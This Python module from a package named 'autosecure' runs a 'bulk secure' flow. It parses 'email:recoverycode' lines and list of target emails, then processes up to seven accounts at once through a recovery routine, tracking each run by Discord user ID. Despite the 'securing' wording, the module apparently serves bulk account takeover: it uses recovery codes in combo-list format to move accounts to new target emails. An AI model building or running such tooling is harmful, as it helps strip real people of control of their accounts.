"""Bulk secure flow for multiple accounts."""

from __future__ import annotations

import asyncio
from typing import Any

from autosecure.core.logging import get_logger
from autosecure.services.securing.otp import SecureResult
from autosecure.services.securing.recovery import recovery_secure

log = get_logger("securing.bulk")

MAX_CONCURRENT = 7


async def bulk_secure(
    accounts_text: str,
    target_emails_text: str,
    user_id: str,
    db: Any = None,
) -> list[SecureResult]:
    """Secure multiple accounts from newline-separated text.

    Parses accounts in email:recoverycode format and processes them
    concurrently up to MAX_CONCURRENT at a time.

    Args:
        accounts_text: Newline-separated accounts (email:recoverycode).
        target_emails_text: Newline-separated target emails to secure to.
        user_id: Discord user ID for tracking.
        db: Optional async database session.

    Returns:
        List of SecureResult for each account processed.
    """
    log.info("bulk_secure.start", user_id=user_id)

    accounts = _parse_accounts(accounts_text)
    target_emails = _parse_target_emails(target_emails_text)

    if not accounts:
        log.warning("bulk_secure.no_accounts", user_id=user_id)
        return []

    results: list[SecureResult] = []
    semaphore = asyncio.Semaphore(MAX_CONCURRENT)

    async def _process_one(
        email: str, recovery_code: str, target_email: str | None
    ) -> SecureResult:
        async with semaphore:
            result = await recovery_secure(
                email=email,
                recovery_code=recovery_code,
                user_id=user_id,
                db=db,
            )
            if result.success and target_email:
                result.account_data["target_email"] = target_email
            return result

    tasks = []
    for i, (email, recovery_code) in enumerate(accounts):
        target = target_emails[i] if i < len(target_emails) else None
        tasks.append(_process_one(email, recovery_code, target))

    results = await asyncio.gather(*tasks, return_exceptions=True)

    processed: list[SecureResult] = []
    for i, result in enumerate(results):
        if isinstance(result, Exception):
            log.error(
                "bulk_secure.account_error",
                index=i,
                error=str(result),
            )
            processed.append(
                SecureResult(success=False, error=str(result), method="bulk")
            )
        else:
            processed.append(result)

    succeeded = sum(1 for r in processed if r.success)
    log.info(
        "bulk_secure.complete",
        total=len(processed),
        succeeded=succeeded,
        failed=len(processed) - succeeded,
    )

    return processed


def _parse_accounts(accounts_text: str) -> list[tuple[str, str]]:
    """Parse newline-separated accounts into (email, recovery_code) tuples.

    Args:
        accounts_text: Raw text with one account per line (email:recoverycode).

    Returns:
        List of (email, recovery_code) tuples.
    """
    accounts: list[tuple[str, str]] = []
    for line in accounts_text.strip().splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        parts = line.split(":", 1)
        if len(parts) == 2 and parts[0] and parts[1]:
            accounts.append((parts[0].strip(), parts[1].strip()))
    return accounts


def _parse_target_emails(target_emails_text: str) -> list[str]:
    """Parse newline-separated target emails.

    Args:
        target_emails_text: Raw text with one email per line.

    Returns:
        List of email strings.
    """
    emails: list[str] = []
    for line in target_emails_text.strip().splitlines():
        line = line.strip()
        if line and "@" in line:
            emails.append(line)
    return emails
